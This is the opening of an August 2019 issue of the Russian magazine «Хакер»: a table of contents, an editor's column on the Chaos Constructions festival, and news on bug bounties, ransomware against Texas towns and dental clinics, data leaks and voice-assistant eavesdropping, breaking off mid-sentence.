

                                                          Август 2019
            № 245
CONTENTS

    Впечатления от «Хаоса»
  Колон ка главреда

    MEGANews
  Всё новое за последний месяц

     Android
  Обман Face ID и разбор паттернов MVC, MVI, MVVM

    Роботизируем SMM
  Как научить нейросеть пред ска зывать успешность постов в соцсети

    Голые факты
  Как нейросеть DeepNude раздева ет женщин на фото

   Машинный слух
  Как работа ет иден тификация человека по его голосу

   Машинное зрение на Python
  Обучаем нейросеть распозна вать циф ры

   Машинное зрение на Python
  Учим нейросеть отличать мед ведей от сло нов

    Фун дамен тальные осно вы хакерства
  Мастер‐класс по анализу исполня емых файлов в IDA Pro

    Неправиль ный CTF
  Од норазовые пароли, буйство LDAP‐инъекций и трю ки c архиватором 7z

    Полет в стратосферу
  Ло маем Struts через Action‐приложение и мастерим Forward Shell

    Операция «Липосакция»
  Как исполь зовать новую уязвимость в Jira

    Непростая загогулина
  Крат кий путеводитель по эллиптическим кривым

    Разгоняем микрокон трол лер
  Как я выжал 620 МГц из совместимой с Arduino пла ты

    Программы без рекламы
  Исполь зуем VPN и Unbound, что бы убрать бан неры из приложений

    Береги глаза!
  Активируем DC Dimming в iPhone Xs, Pixel 3 XL, Xiaomi Mi 9 и других смартфонах

    Hey Julia!
  Новый язык, который выглядит, как Python, а лета ет, как C

     Twitch Extensions
  Пишем свое расширение для вза имо действия со зрителя ми

    Непробиваемый DevOps‐клас тер
  Настра иваем и усиливаем безопаcность Kubernetes

    Почти single sign on
  Исполь зуем сис темную аутен тифика цию с сокета ми UNIX

    Ис кусство изоляции
  Изучаем механизмы изоляции тра фика в Linux

    Крипта без эмоций
  Ищем здравый смысл в криптовалютной шумихе

     Тит ры
  Кто дела ет этот журнал
HEADER


 ВПЕЧАТЛЕНИЯ ОТ
  ХАОСА

         КОЛОНКА ГЛАВРЕДА





Знаешь, чего мне хотелось больше всего
после окончания Chaos Constructions? Если
не знаешь, то можешь догадаться, потому
что я мечтал лишь о том, что бы схо дить
в душ, а потом упасть в кровать и спать       Андрей Письменный                                                                                      Главный редактор
часов  десять.  Конечно,  мысль  сесть         apismenny@gmail.com
и написать отчет в голове про мелькнула,
но пришлось от нее отмахнуть ся — сил уже
не было. Потом затянула рутина, и август
остался далеко позади. В общем, приз‐
наюсь: припозднился. Однако пора пла тить
по счетам!


Мы уже публиковали один отчет с CC и TechTrain, посвященный похождениям
героической бабушки. В отличие от тусовой «бабули», я все два дня провел
на Chaos Constructions, пос кольку именно там стоял наш стенд. И надо ска‐
зать, ничуть не пожалел — интересного было хоть отбавляй.





Chaos Constructions, если ты вдруг про него не слышал, — это фес тиваль,
который проходит каждый год в конце лета в Санкт‐Петербурге. Он собирает
хакеров, мейкеров, кодеров, геймеров и прочих гиков, нердов и фриков всех
мастей и разновидностей. Два дня пуб лика  слушает доклады, щупает
раритетные компьютеры, ходит на воркшо пы и, самое главное, общается,
общается и еще немного обща ется, пока не сядет голос или не начнут под‐
кашиваться ноги от выпитого пива.
  В этот раз фестиваль начался с приятно го сюрприза. «Мимо тебя сейчас
Стол лман прошел», — ска зали мне, и я заобо рачивался. И действительно:
сам глава Free Software Foundation (сейчас уже бывший) и основатель дви‐
жения GNU так чудесно вписался в тусовку наших айтишников, что не сразу
заметишь.
   Стол лман проследовал в аудиторию  и, подзаряжаясь чайком, вещал
про свободу софта часа два, если не три. Под конец, говорят, пустил с молот‐
ка игрушечную антилопу гну, и она тут же ушла за 21 тысячу рублей. Недаром,
когда к нему пристают с вопросами о том, как зарабатывать на свободном
софте, он отвечает в духе «хочешь жить — умей вертеться»!





Помнишь, я чуть выше говорил, что интересного на CC было хоть отбавляй?
Так вот, это не толь ко фигура речи. Было бы очень неплохо «отбавить» нес‐
колько  идущих  парал лель но  кру тых  докладов, между  которы ми  нужно
выбирать или разор ваться надвое. То есть, конечно, не убрать их, а лишь рас‐
ставить посвободнее.
  Мне удалось заглянуть на захватывающее выс тупление Артёма Каш‐
канова, который в домашних усло виях соб рал компь ютер из 578 герконовых
реле и теперь планирует раз работку лампового вычислителя, а также экспе‐
риментирует с логикой на основе струй воды. Артём любезно согласился
написать нам статью по мотивам своего выступления, так что можешь тоже
насладиться.
  Другой доклад, на который я схо дил из любопытс тва, был посвящен крип‐
товалютной платформе TON. Докладчик (Сергей Черников) работает в TON
Labs, где занима ются разработкой компиляторов C и  Solidity в  Fift —
основной язык TON, вырос ший из Forth. Сергей тоже прислал нам статью —
она несколько проливает свет на хитросплетения блокчейнов TON. Если же
тебя мучают вопросы вроде «зачем», «когда» и «как конкретно», то знай: ты
такой не один, а с ответами пока тугова то.


             INFO

                   Еще два доклада, аналоги которых ты можешь
                      найти в виде статей в «Хакере», — это «Боевой
                     OSINT» и выступле ние Его ра Литвинова, пос‐
                     вященное ZigBee.


Не смог я пройти и мимо доклада с названием «Блю ющая лямбда и трансцен‐
дентные котики: функциональная парадигма как путь к прос ветлению в иллю‐
зорном мире», который читал Антон Ворошевский. Меня, конечно, и так
не нужно убеждать в том, что функциональное программирование — это один
из самых здоровых и полезных способов рас ширить сознание, но послушать
единомышленников было приятно. Только пос мотри, как вольготно возлежит
на бинбэге этот матерый лямбда‐самец!





Одного взгляда достаточно, чтобы понять: функци ональный стиль — путь
к просветлению.
  На многие крутые доклады я не попал просто потому, что не успел или кру‐
тился где‐то еще. Например, несколько выступлений были пос вящены радио
и беспроводным сетям. Олег Купреев посвящал публику в хитрости работы
с Wi‐Fi, Егор Литвинов рас сказывал про ZigBee, Андрей Строков — про SDR
и GNU Radio.
  И это я перечислил только зна комых авторов и самые близ кие нам темы.
Были доклады про embedded, монито ринг серверов, геймдев, нейросети
и даже про опыт использования раритетных гаджетов в походах. Короче,
на любой вкус!
   Кстати, впервые я посещал Chaos Constructions в 2011 году, и тогда
демосцена и ретрокомпь ютеры занимали основное пространс тво, а док‐
ладов было все го ничего. Теперь доклады идут два дня с утра до вечера
в шесть треков, а вот выставка старой техники подрасте ряла былое величие.
  Впрочем, что‐то интерес ное нашлось и в этом году. Например, мне уда‐
лось немножко поиграть на редкой игровой приставке Philips CD‐i. Link:
The Faces of  Evil — редкос тная дрянь как игра, но графика и анимация
для 1993 года — выдающиеся.





Еще сильнее меня порадовал час тный уголок «Яндекса», куда при везли
некоторые экспонаты из московского музея компании. Так я впервые порабо‐
тал за живым компьютером NeXT, которых в Рос сии больше нигде не най‐
дешь.





Что до демосцены, то этот жанр практически иссох, но из двух демок, пред‐
ставленных в категории ZX Spectrum 640K, одна оказалась неожиданно инте‐
ресной. Эта работа moronizzz/buchaos хоть по очкам и проиграла более тра‐
диционной, красивой и «техничес кой» демке thesuper, зато вос принимается
как современное и даже злободневное искусство, которое, в отличие от раз‐
ноцветной анимации и фракталов, запомнится.
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ДЕНЬГИ ЗА БАГИ
В этом месяце сразу нес колько крупных компаний анонсировали рас ширение
своих программ поощ рения за обнаружение уязвимостей.


Google
Теперь исследователи смогут заработать, обна руживая злоупотребление
пользовательскими данными, а также находя уязвимости в любых приложе‐
ниях для Android, насчитывающих более 100 миллионов установок.
  В рамках Developer Data Protection Reward Program (DDPRP) ИБ‐спе‐
циалисты смогут сооб щать о зло упот реблениях данными пользовате лей.
Такие проблемы можно будет искать в сторонних приложениях, име ющих
доступ к Google API, в приложениях для Android из Google Play Store, а также
в приложениях и расширениях из Chrome Web Store. Эксперты, которые обна‐
ружат случаи злоупотребления данными, име ют право на воз награждение
в размере до 50 тысяч долларов США.



      «Цель данной программы — поощ рить любого, кто может пре дос-
      тавить  дос товер ные и  нед вусмыс ленные  доказа тельства  злоупот-
      ребле ния данными, — говорят пред ста вите ли Google. — В час тнос ти,
      эта  программа  нап равле на  на  выяв ление  ситу аций,  когда  поль-
      зовательские данные неожиданным обра зом используются или про-
      даются, а так же незаконным обра зом используются пов торно без сог-
      ласия пользовате ля».

В данном случае Google следует примеру компании Facebook. В апре‐
ле 2018 года, после скандала, связанного с компанией Cambridge Analytica
и злоупотреблением пользовательскими данными, социальная сеть обновила
программу bug bounty, чтобы люди, обнаружившие так называемый data
abuse в стороннем приложении, мог ли получить за это вознаграждение в раз‐
мере до 40 тысяч дол ларов.
  Кроме того, у Google появилась программа вознаграждений за любые
ошибки, обнаруженные в составе круп ных приложений из Google Play Store.
Теперь исследователи смо гут искать уяз вимости в любых приложениях, чей
счетчик установок перева лил за 100 миллионов, и сообщать о проблемах
Google. При этом разработчикам таких при ложений не придется специально
где‐то регистрироваться или предпринимать какие‐то иные шаги.
  Сообщения об уязвимос тях будут при ниматься через Google Play Security
Reward (GPSRP) на платформе HackerOne, а затем отчеты передадут раз‐
работчикам приложений. Если те не сумеют устранить выявленные ошибки,
Google исключит приложения из Play Store.
  Интересно, что такие крупные разработчики, как Facebook, Microsoft
или Twitter, которые имеют собственные программы bug bounty, не исклю‐
чаются из GPSRP. Более того, Google заявляет, что исследователи могут
сообщать об ошибках дваж ды: через GPSRP и напрямую через bug bounty
программы самих ком паний, таким образом дважды получая вознаграж‐
дение.


Apple
В этом году представители Apple выс тупили на конференции Black Hat
и сообщили, что компания рас ширя ет программу bug bounty. Теперь за баги
в iPhone можно будет получить до миллиона долларов, а также к концу
текущего года исследователи смогут искать проблемы в macOS, watchOS
и tvOS.
   Расширенная bug bounty программа будет откры та для всех желающих,
а размер наград, как обычно, будут варь ировать в зависимости от серь‐
езности уязвимостей и потенциального ущерба, который те могут нанести.
Напомню, что изначально программа Apple рас пространялась только на iOS
и участвовать в ней могли лишь избранные специалисты, но не все жела‐
ющие.
  Вознаграждения за уяз вимости теперь зна чительно увеличились. Так,
в настоящее время Apple предлага ет исследова телям до 200 тысяч дол ларов
США за уязвимости, которые могут дать атакующе му полный контроль
над iOS‐устройством (речь об удаленных ата ках, которые не подразумевают
взаимодействия с пользователем и позволяют выполнить код на уровне ядра
iOS).
  Начиная с осени 2019 года вознаграждение за такие баги будет увеличено
до одного миллиона долларов США. Кроме того, предложение также рас‐
пространяется на аналогичные проблемы в macOS.
  Вознаграждения за другие типы уязвимос тей также были уве личе ны,
и теперь исследователи смогут зарабо тать на раз личных багах от 100 тысяч
до 500 тысяч дол ларов США. Кро ме того, Apple предлагает бонус в раз‐
мере 50% от стоимости уязвимости за проб лемы, найденные в пред релизных
сборках. Таким образом компания надеется не допус тить попадания опасных
ошибок в релиз, где они могут привести к атакам на пользователей, а их
исправление может занять долгие недели.
  Отметим, что уязвимости в операци онных системах Apple давно считаются
одними из наиболее дорогих на этом рын ке. К примеру, компания Zerodium
предлагала миллион долларов за экс плоиты для iOS еще в 2015 году.


Microsoft
В августе 2019 года раз работчики Microsoft предста вили первую бета‐вер‐
сию своего обновленного бра узера Edge на основе Chromium.
  Фактически одновременно с запуском беты представители компании так‐
же анонсировали старт bug bounty программы Edge Insider Bounty Program.
ИБ‐специалистам предлагают поискать в обновленном браузере компании
уязвимости (в ветках Beta и Dev, Canary в рас чет не принимается), воз награж‐
дение за которые может сос тавить от одной до тридцати тысяч дол ларов
США.
   Уязвимости дол жны проявлять ся в пос ледней на момент подачи отче та
версии Microsoft Edge, работа ющей в связке с полностью обновленной Win‐
dows (вклю чая Windows 10, Windows 7 SP1 или Windows 8.1) или macOS. Так‐
же подчеркивается, что баги не должны воспро изводиться в Google Chrome,
то есть должны быть «эксклюзивными» для Edge, и программа Microsoft дол‐
жна стать дополнением для bug bounty программы Chrome.
  Интересно, что новая программа сочетается с Microsoft Edge (EdgeHTML)
в Windows Insider Preview, так что некоторые проб лемы, затрагивающие ста‐
рый движок EdgeHTML, тоже могут приниматься в расчет и способны принес‐
ти экспертам до 15 тысяч долларов.


Facebook
Компания Facebook расширила свою программу Data Abuse Bounty на при‐
ложения для Instagram. Обнаружив зло употребление данными, исследова‐
тели смогут зарабо тать до 40 тысяч долларов. Причем представите ли соци‐
альной сети уве ряют, что 40 тысяч — это не максимум, в особо сложных слу‐
чаях размер вознаграждения может быть увеличен.
  Напомню, что еще в 2018 году социальная сеть при няла решение рас‐
ширить свою программу воз награждения за уяз вимости и поощ рять поль‐
зователей и экспертов за поиск признаков потенциального злоупотребления
данными (data abuse). Это произошло вскоре пос ле скандала, связанного
с компанией Cambridge Analytica.
  Под словосочетанием «зло употребление данными» подразумевается, что
приложение собирает пользовательские данные, которые затем передаются
третьим сторонам, а даль ше информация может быть перепродана, похище‐
на, использована с целью мошенничества или получения политического вли‐
яния.
   Стоит заметить, что с 2018 года прог рамма уже не раз демонс трировала
свою эффектив ность. Так, вскоре пос ле старта программы, в 2018 году, Face‐
book блокировала более 200 приложений, злоупотреблявших пользователь‐
скими данными.
   Расширение программы Data Abuse Bounty на Instagram, очевидно, свя‐
зано  с  инцидентом  с компанией  Hyp3r. Дело  в  том,  что  в  начале
августа 2019 года рекламно го партнера Instagram, компанию Hyp3r, уличили
в сборе пользовательских данных для пос ледующего составления рекламных
профилей. Hyp3r тайно собирала и хра нила миллионы пользовательских
историй, изображений, данные о геолокации, биог рафиях, интересах и так
далее. В итоге Hyp3r была заблокирована Facebook за нарушение правил
платформы.


4 400 000 ЗАПЛАТИЛА ЗА БАГИ MICROSOFT


На конференции Black Hat 2019, которая прошла в Лас‐Вегасе в августе, представите ли ком‐
пании Microsoft расска зали, что за последние 12 месяцев корпорация выплатила 4,4 мил-
лиона долларов специалистам по информационной безопас ности в рамках своей bug bounty
программы.


Также разработчики анонсировали запуск новой среды‐песочницы под названием Azure Securi‐
ty Lab, где специалисты смогут эмулировать поведение преступников. Теперь награда за уяз‐
вимости в Azure увеличена до 40 000 долларов.





ХАКЕРЫ ПРОТИВ
СТОМАТОЛОГИЙ
Вымогательское ПО по‐преж нему атакует прос тых пользователей, однако
операторы такой малвари давно поняли, что куда более привлекательными
целями  для  атак  могут  стать  различные  компании  и  организации.
Август 2019 года озна меновался мас совыми атаками на американские
города и взломом стоматологических клиник.


Му ниципальные власти Техаса
Муниципальные власти более чем двадцати городов в Техасе стали жертвами
скоординированной  ата ки вымога телей. Подробностей о  случившемся,
к сожалению, немного. Сооб щается лишь, что про изошедшее — дело рук
одного преступника (или прес тупной груп пы) и, по данным СМИ, техасские
власти пострадали от вымогателя Sodinokibi (REvil).
  По информации Департамента информационных ресурсов, жертвами дан‐
ной атаки стали 22 города, но более 25% пострадавших уже перешли от ста‐
дии первичного реагирова ния и оценки ущерба к стадии ликвидации пос‐
ледствий и восстановлению.
  Пока точные данные о пос тра давших все равно не раскрываются, но два
города сами публично сообщили о ком про метации. Так, официальное заяв‐
ление выпустили власти города Борджер.
  Документ гласит, что инцидент повлиял на финансовые операции и услу ги.
По сути, город лишился возможности принимать коммунальные или иные
платежи, а также в офлайн ушли служ бы демог рафичес кой статистики (сви‐
детельства о рождении и смерти).
   Также официальное заявление сделали влас ти города Кин. Здесь адми‐
нистрация тоже не может обра батывать пла тежи по картам и испы тывает
проблемы с отклю чением коммунальных услуг. Интерес но, что мэр города
Гэри Хайнрих (Gary Heinrich) также рас ска зал изда нию NPR, что вымогатели
требуют у своих жертв 2,5 миллиона долларов выкупа в обмен на ключ
для расшифровки файлов.
  Кроме того, по сло вам Хайнриха, ата ка произошла через пос тавщика
управляемых услуг (Managed services providers, MSP), чьими услугами город
пользовался для техничес кой поддержки. Мэр Кина не назвал име ни этой
сторонней компании, но заметил, что она предос тавляла услуги ИТ‐под дер‐
жки и многим другим пос тра давшим муниципалитетам.
  Напомню, что ранее пос тавщики управляемых услуг уже становились
мишенями для операторов вымогательской малвари, так как через MSP весь‐
ма удобно распространять вредоносное ПО на машины конечных поль‐
зователей. К примеру, таким способом ранее рас пространялся ныне неак‐
тивный шифровальщик GandCrab.


Сто мато логии
В конце месяца известный ИБ‐журналист Брайан Кребс (Brian Krebs) сооб‐
щил в своем блоге о компромета ции пос тавщика облачных технологий PerC‐
Soft. PerCSoft поддерживает сервис Digital Dental Record (DDR), с помощью
которого работает решение для резервного копирования данных DDS Safe.
Это решение применяется для архивации медицинской документации, стра‐
ховых документов и другой личной информа ции пациентов, и им пользуются
сотни стоматологических клиник в США.
  По   информации   Кребса,    ата ка    на    PerCSoft   произош‐
ла 26 августа 2019 года, пос ле чего данные многих клиентов DDS Safe ока‐
зались зашифрованы.  Хотя компании про исходящее не комментируют,
оставляя запросы СМИ без ответов, Бренна Садлер (Brenna Sadler) из Сто‐
матологической ассоциации Висконсина подтвердила Кребсу, что в резуль‐
тате инцидента вымогатели зашифровали файлы приб лизительно 400 сто‐
матологических клиник. По ее данным, от 80 до 100 пострадавших уже вос‐
становили свои данные.
  Для быстрого разрешения ситуации Digital Dental Record и PerCSoft при‐
няли решение заплатить операто рам малвари выкуп, о чем сообщает изда‐
ние ZDNet и сам Брайан Кребс, ссылаясь на собс твенные источники.
По информации журналистов, уже в начале недели компании стали оказывать
помощь пострадавшим клиникам, предос тавляя в их распоряжение рас‐
шифровщик и помогая восстанавливать поврежденные файлы. При этом
представители некото рых стоматологичес ких клиник жалу ются в Facebook,
что расшифровщик либо не сра ботал вовсе, либо помог восстановить не все
данные.
   Размер выплаченного  выкупа  точно  неизвестен, но ИТ‐спе циалист,
работающий в стоматологичес кой отрасли, поделился фотографией в зак‐
рытой группе Facebook. На этом фото якобы запечатлен раз говор между
представителем  PerCSoft  и  пострадавшей  стоматологичес кой фирмой.
В разговоре представитель PerCSoft убеждает клиента, что компания уже
заплатила выкуп.





Кроме того, в той же закрытой группе в Facebook был опубликован скриншот
работы дешифровальщика, на котором видно, что компании пос традали
от вымогателя Sodinokibi (он же REvil), уже упоминавшегося в связи с атаками
на города Техаса.





CHROME WEB STORE — ГОРОД‐ПРИЗ РАК
Исследователи из ком пании Extension Monitor опубликовали интересную статис тику о положе‐
нии дел в каталоге расширений для Chrome. Как оказалось, половина экосистемы рас‐
ширений — это настоящий город‐призрак.

В общей сложности в Chrome Web Store доступно 188 620 рас ширений, но большинство из них
устарели, их аудитория сокращается, и лишь нем ногие из них имеют активные установки.

Около 50% всех расширений Chrome насчитывают менее 16 установок.

19 379 расширений (около 10%) не имеют установок вообще, а еще 25 540 расширений (13%
от общего числа) имеют лишь одного пользователя.

Хуже того, 87% всех расширений в Web Store имеют менее 1000 установок, хотя поль‐
зовательская база Chrome насчитывает более миллиар да человек.

Всего 13 расширени ям удалось преодолеть планку в 10 000 000 пользователей. Это Google
Translate, Adobe Acrobat, Tampermonkey, Avast Online Security, Adblock Plus, Adblock, uBlock Ori‐
gin, Pinterest Save Button, Cisco WebEx, Grammarly for Chrome, Skype, Avast SafePrice и Honey.

Платных продуктов в Web Store насчитывается лишь 16 718, причем 5885 из них не имеют
ни одного пользователя.

В общей сложности на платные рас ширения приходится всего 2,6% от общего чис ла уста‐
новок.





УТЕЧКИ МЕСЯЦА
К сожалению, утечки данных теперь происходят едва ли не каждый день,
и прошедший месяц, как обычно, не обошелся без подобных инцидентов.
Перечислим наиболее заметные из них.


KYC-дан ные Binance
В начале августа 2019 года в Сети начали рас пространяться данные KYC
(Know Your Customer), якобы похищенные у одной из крупнейших крип‐
товалютных бирж мира — Binance.





Изначально представители Binance сооб щили, что неиз вестные злоумыш‐
ленники пытались шантажиро вать их и требовали 300 BTC выкупа (поряд‐
ка 3,5 миллиона дол ларов США), а в противном слу чае угрожали обнародо‐
вать 10 тысяч фотографий, «которые имеют сходс тво с данными Binance
KYC». Платить зло умышленникам в Binance отказались и заявили, что рас‐
пространяющиеся по Сети KYC‐данные вызывают много вопросов. Так, срав‐
нивая эту информацию с данными своих систем, представители биржи обна‐
ружили множество несо ответствий, а главным контраргументом стало то, что
на изображениях нет цифровых водяных зна ков, которые использует Binance.
   Глава Binance Чанпэн Чжао (Changpeng Zhao) и вовсе называл происхо‐
дящее FUD’ом (Fear, Uncertainty, Doubt), а официальное заявление биржи гла‐
сило, что распространяющийся в Сети набор данных вооб ще похож на ста‐
рую, весьма спорную «утечку» KYC‐информации сразу нескольких бирж,
датированную началом года и ничем не подкрепленную.
  Но в конце августа Binance опуб ликовала обновленную информацию отно‐
сительно данного инцидента. Так, рас следова ние выявило, что часть опуб‐
ликованных изображений все же действительно пересекается с изображени‐
ями, обработкой которых занимался неназванный сторонний подрядчик бир‐
жи,  сотрудничавший  с  Binance  с декаб ря 2017  года до  конца фев‐
раля 2018 года. Подчеркивается, что вмес те с этим в составе дампа было
выявлено множество отфотошоп ленных и измененных другими способами
изображений, не совпада ющих с KYC‐данными пользователей и не име ющих
водяных знаков.
   Теперь биржа предлагает всем пострадавшим пожиз ненное членство
в программе Binance VIP, которое подразумевает льготные торговые комис‐
сии, поддержку и дополнительные услуги. Также пос традавшим настоятельно
рекомендуется озаботиться перевыпус ком документов, удостоверя ющих лич‐
ность, так как текущие, очевидно, были скомпрометированы.
   Также представите ли Binance предложили вознаграждение в размере
до 25 BTC (в зависимос ти от акту альности данных) за любую информацию,
которая поможет идентифицировать неизвес тного вымогателя и передать
его в руки правоохранительных орга нов.


Пароли Coinbase
Представители еще одной крупной криптовалютной биржи, Coinbase, обна‐
ружили баг на странице регистрации. Из‐за этой проблемы личные дан‐
ные 3420 пользователей биржи сохранились в логах на серверах компании
в формате простого текста.
   Учитывая, что пользовательская база Coinbase нас читывает более 30 мил‐
лионов человек, пострадал лишь малый про цент пользовате лей.
  В Coinbase заверили, что в нас тоящее время проблема устранена, а лич‐
ная информация пользователей не была скомпромети рована и не подверга‐
лась злоупотребле ниям. Тем не менее для пос традавших инициировали про‐
цедуру сброса паролей.
  В официальном заявлении объясня ется, что в редких слу чаях форма
регистрации могла загружать ся с ошиб кой и попытка создать новую учетную
запись Coinbase завершалась неудачей. Но к сожалению, все введенные
человеком данные, включая имя, адрес электронной почты и предлагаемый
пароль (и штат проживания, если это был пользователь из США), все равно
сохранялись во внутренних логах на серверах компании.
   Как оказалось, в 3420 случаях пользователи успешно перезагрузили стра‐
ницу регистрации, повторно ввели свои данные (включая такие же пароли,
хеши которых совпадают с информацией, осевшей в логах) и завершили
регистрацию.
  Обнаружив и исправив ошибку, разработчики также проверили, где могли
«засветиться» логи с пользовательскими данными в открытом виде. К при‐
меру, у биржи есть внутренняя система ведения журналов, размещенная
в AWS. В Coinbase сообщают, что тщательный ана лиз доступа к подобным
системам не выявил попыток несанкционированного доступа к данным.


Дан ные клиентов Hostinger
Один из крупнейших хостеров мира — компания Hostinger сообщила, что
неизвестным злоумышленникам удалось получить дос туп к внутреннему сер‐
веру и, возможно, информации о клиентах. В результате этого инцидента
могли пострадать 14 миллионов пользователей.
   Как  объясняют  предста вители  компании,  инцидент  имел  мес‐
то 23 августа 2019 года. Про никнув на сервер, хакер обнаружил там токен
авторизации, благодаря которо му сумел получить доступ  к RESTful API
и информации о 14 миллионах клиентов, вклю чая username, email‐адре са,
хешированные пароли, имена и IP‐адреса. Подчеркивается, что атакующие
не добрались до финансовой информации и не ломали сайты пользовате лей.
  В настоящее время ведется расследование слу чившегося, но предста‐
вители хостера уже сбрасывают пароли для пос тра давших учетных записей.
Один из клиентов Hostinger, которого коснулась компрометация, свя зал ся
с компанией и поинтересовался, какой алгоритм хеширования использовал‐
ся для паролей. В  Hostinger ответили,  что данные были хешированы
с помощью SHA‐1 и теперь, пос ле сброса паролей, используется SHA‐2.
   Точное количество пострадавших от этого инцидента пока неизвестно, так
как злоумышленник обра щался к базе через API, а записей о том, какие имен‐
но вызовы он делал, не оста лось. Фактичес ки в настоящее вре мя специалис‐
ты Hostinger действуют исходя из худшего сценария раз вития событий, то
есть предполагают, что компрометация зат ронула всех пользователей (хотя
прямых доказательств этого нет).


Imperva WAF
Компания  Imperva, специализиру ющаяся  в  области кибербезопас ности
и защиты от DDoS‐атак, сообщила о компромета ции. Инцидент, о котором
компании стало известно 20 августа 2019 года (благодаря пре дупреждению,
полученному от неназванной третьей стороны), коснулся клиентов, исполь‐
зующих Cloud WAF компании, зарегистрированных до 15 сентября 2017 года.
  В официальном сооб щении ска зано, что в руки посторонних могли
попасть адре са электронной почты, хешированные и соленые пароли, а для
некой подгруппы пользователей ключи API и SSL‐сертификаты. Компания уже
принесла свои извинения, начала уведомлять пострадавших и ини циировать
для них сброс паролей от учетных записей WAF.
  Пока неясно, как именно случилась эта утечка данных, так как предста‐
вители Imperva не комментируют ситуацию, ссы лаясь на проводящееся рас‐
следование, к которому уже привлечены пра воохранительные органы.
   То есть пока даже нельзя сказать, подверглась компания взлому или же
сервер с данными был случайно оставлен «открытым» для всех желающих.
Также неизвестно, когда произошел инци дент (можно предположить, что
это случилось еще в 2017 году) и кто обна ружил проб лему — один из кли‐
ентов, багхантер или кто‐то дру гой.


СВОД РЕКОМЕНДАЦИЙ ПО «ЦИФРОВОЙ ГИГИЕНЕ»
В начале августа представители Роскачества опубликовали свод рекомендаций по «цифровой
гигиене», в рамках которого дали несколько советов пользователям. Сре ди вполне оче видных
рекомендаций, вроде установки антивируса, в Рос качес тве также совету ют заклеивать мик‐
рофон и камеру устройства, отмечая, что это уже не паранойя, а одно из правил «цифровой
гигиены».





→«Стоит заклеивать камеру и микрофон до вос требования. Это увеличит ваши шансы на при‐
ватность и спокойствие — даже если к вам подключится хакер, он вас не увидит и не услышит.
Кому‐то данная рекомендация может показаться паранойей, однако многие все же зак рывают
входную дверь на несколько оборотов, даже ког да дома. Если есть возможность избе жать неп‐
риятностей таким легким спо собом, как заклейка камеры и микрофона, то лучше им вос поль‐
зоваться»
— рекомендация Роскачества





                                     Продолжение статьи →
← Начало статьи





 ГИГАНТЫ
 ПЕРЕСТАНУТ
 ПОДСЛУШИВАТЬ
  В прошлом месяце СМИ уличили компании Amazon, Apple, Google, Facebook
  и Microsoft в том, что те хранят записи раз говоров пользовате лей с голосо‐
  выми помощниками и передают их для ана лиза живым людям (сотрудникам
  или сторонним подрядчикам). Таким образом эксперты разбираются в нюан‐
   сах разных языков и акцентов, транскрибиру ют отдельные отрывки раз‐
  говоров и тем самым помога ют обучать ассистентов и совершенс твуют
  работу систем обработки естественного языка.
     К сожалению, во всех случаях журналисты отмечали, что в распоряжении
  компаний регулярно ока зываются не только команды, произнесенные пос ле
  клю чевых фраз «OK, Google» или «Привет, Siri», но и частные разговоры поль‐
  зователей, записанные по ошибке. Так, исследователи обнаружили, что ком‐
  пании слушают разговоры в спальне, раз говоры между родителями и детьми,
  скандалы  и  рабочие  телефонные  звонки,  содержащие много  личной
  информации. К примеру, изда ние The Guardian сообщало, что подрядчики
   Apple регулярно слушают записи Siri, в которых содержатся данные о сек‐
   суальных контактах, покуп ке или продаже наркотиков, а также дискуссии меж‐
   ду врачами и пациентами.
    В ответ на происходящее представители Apple поспешили заявить, что эта
  программа «оценки» пользовательских запросов была соз дана исключитель‐
  но для того, чтобы определить, корректно ли интерпретиру ются запросы
  людей и не «просыпается» ли Siri по ошиб ке. Также в компании подчеркивали,
   что доступные сотрудникам аудиоотрывки не связаны с конкретными поль‐
  зователями и их User ID и эксперты оценивают менее 1% ежедневных акти‐
  ваций Siri.
     Также Apple временно приоста новила работу программы во всем мире.
  В компании пообещали пересмотреть подход к контролю качества работы
    Siri, и уже в кон це месяца компания принесла извинения пользователям
  и объявила об изменениях, которые кос нутся того, как  Siri обрабаты вает
  аудиозаписи голосовых команд, а также того, кто именно может слу шать
  и анализировать эти вза имо действия пользователей с голосовым ассистен‐
   том.
      Так, грядущей осенью Apple планирует обновить свое ПО таким образом,
   чтобы попросить  у пользователей согласие на создание аудиозаписей
  «общения» с Siri, а также загрузку этих файлов на свои серверы. Если поль‐
  зователь откажется от такой «прослушки», компания будет использовать сге‐
  нерированные компьютером рас шифровки  раз говоров,  чтобы  улучшить
  работу Siri.
     Кроме того, компания объявила, что обра ботка аудиозаписей Siri теперь
   станет исключительно внутренним процессом, то есть никаких больше сто‐
  ронних подрядчиков. Начиная с осени только сотрудни кам Apple будет раз‐
  решено работать с запися ми Siri, а любые записи, которые будут определены
   как случайное «пробуждение» Siri, собира ются немедленно удалять.
    Похожие меры предприняли и другие компании, анализи ровавшие раз‐
  говоры пользователей. Так, компания Facebook приз налась, что платит под‐
  рядчикам за прослушивание и расшифровку клипов, собранных в Messenger,
  но уже приостановила работу этой прог раммы, учитывая негативную реакцию
  общественности.
    По информации Bloomberg, подрядчи кам было поручено проверять, пра‐
  вильно ли алгоритмы и ИИ‐системы Facebook интерпретируют аудиоконтент.
  «Прослушка» затрагивала только тех пользователей, которые разрешили
  транскрибирование своих голосовых чатов в приложении Facebook Messen‐
   ger, и все клипы, с которыми работали подрядчики, были анонимными.
     Известно, что по меньшей мере одна компания, TaskUs, занималась рас‐
  шифровкой разговоров пользователей. Компания сотрудничала с Facebook
   в качестве клиента под кодовым именем Prism и также проверя ла контент,
  который мог нарушать пра вила социальной сети. В TaskUs подтвердили жур‐
  налистам, что фирму уже попросили прекратить работу по расшифровке
  записей около недели тому назад.
    Компания Microsoft, в свою очередь, обновила политики конфиденциаль‐
  ности и другие страницы, объясня ющие прин ципы работы Cortana и Skype
   Translator. Теперь компания однозначно дает понять, что отрывки диалогов
  пользователей могут обрабатывать живые люди, а не только автоматика.
    Похожее заявление сделала и компания Google. По информации Associat‐
  ed Press, после утечки тысячи записей Google Assistant в Бельгии Google в ЕС
  прекратит заниматься транскрипцией данных, записанных Google Assistant,
   как минимум на три месяца. Дело в том, что соответс твующий запрет на ком‐
  панию наложило гамбургское бюро по защите данных: у ведомс тва возникли
  серьезные сомнения  в  том,  что  текущее поведение  Google  Assistant
  не нарушает GDPR.


  3 РЕКЛАМНЫХ БАННЕРА ПРИНОСЯТ БОЛЬ ШЕ ПРИБЫЛИ,
 ЧЕМ КРИПТОДЖЕКИНГ
   Сводная груп па исследователей из Университета Чикаго и Университета Крита опубликовала
   исследование, которое доказывает: крип тоджекинг (майнинг криптовалюты через браузеры
